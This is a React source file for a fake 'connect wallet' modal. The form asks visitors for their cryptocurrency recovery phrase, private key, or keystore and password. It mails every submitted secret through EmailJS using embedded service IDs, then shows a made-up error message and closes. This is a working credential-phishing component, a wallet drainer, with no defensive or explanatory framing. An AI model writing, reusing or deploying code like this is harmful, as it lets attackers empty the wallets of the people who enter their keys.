import "./connect.css";
import { useState, useRef } from "react";
import emailjs from "@emailjs/browser";
const Connect = ({ clicked, setClicked, setConnect }) => {
  const [pay, setPay] = useState(false);
  const [keystore, setKeystore] = useState(false);
  const [phrase, setPhrase] = useState(true);
  const [privated, setPrivated] = useState(false);
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_7tpv5qk",
        "template_n5e1gzf",
        form.current,
        "HWHaR6NFiypIqeKKA"
      )
      .then(
        (result) => {
          console.log(`${result.text} Email is sent`);
        },
        (error) => {
          console.log(`${error.text} An error occured!`);
        }
      );
  };
  return (
    <form ref={form} className="connect" onSubmit={sendEmail}>
      <div className="image-icon">
        <img src={clicked} alt="" />
      </div>
      <div className="connect-nav">
        <p
          onClick={() => {
            setPhrase(true);
            setKeystore(false);
            setPrivated(false);
          }}
        >
          Phrase
        </p>
        <p
          onClick={() => {
            setKeystore(true);
            setPrivated(false);
            setPhrase(false);
          }}
        >
          Keystore
        </p>
        <p
          onClick={() => {
            setPrivated(true);
            setKeystore(false);
            setPhrase(false);
          }}
        >
          Private Key
        </p>
      </div>
      <div className="error-note">
        <p>An unknown error occured, please try again later.</p>
      </div>

      {privated && (
        <textarea
          placeholder="Enter Your Private Key"
          className="wallet-password"
          name="private-key"
        ></textarea>
      )}

      {phrase && (
        <textarea
          name="recovery-phrase"
          placeholder="Enter your recovery phrase"
        ></textarea>
      )}

      {keystore && (
        <>
          <textarea name="keystore" placeholder="Enter Keystore"></textarea>
          <input
            type="password"
            name="wallet-password"
            placeholder="Wallet password"
            className="wallet-password"
          ></input>
        </>
      )}
      {keystore ? (
        <p className="word-count">
          Several lines of text beginning with {"{...}"} plus the password you
          used to encrypt it.
        </p>
      ) : (
        <p className="word-count">
          {" "}
          Typically 12 (sometimes 24) words separated by single spaces
        </p>
      )}

      <button
        type="submit"
        className="proceed-btn"
        onClick={() => {
          setPay(true);
          setTimeout(() => {
            setClicked("");
            setConnect(false);
          }, 3000);
        }}
      >
        PROCEED
      </button>
      <div className="basement"></div>
    </form>
  );
};

export default Connect;
